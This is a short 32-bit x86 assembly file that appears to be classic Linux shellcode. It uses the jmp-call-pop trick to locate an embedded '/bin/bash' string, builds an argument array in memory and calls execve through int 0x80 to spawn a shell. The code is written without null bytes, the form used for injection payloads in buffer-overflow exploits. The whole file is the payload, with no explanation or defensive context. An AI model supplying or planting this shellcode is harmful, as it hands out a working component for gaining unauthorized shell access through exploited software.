section .text
  global _start
    _start:
	BITS 32
	jmp short two
    
    one:
     	pop ebx
     	xor eax, eax
     	mov [ebx+9], al	  
     	mov [ebx+12], ebx 
     	mov [ebx+16], eax
     	lea ecx, [ebx+12] 
     	xor edx, edx
     	mov al,  0x0b
     	int 0x80
    
    two:
 	    call one
 	    db '/bin/bash---AAAABBBB' 
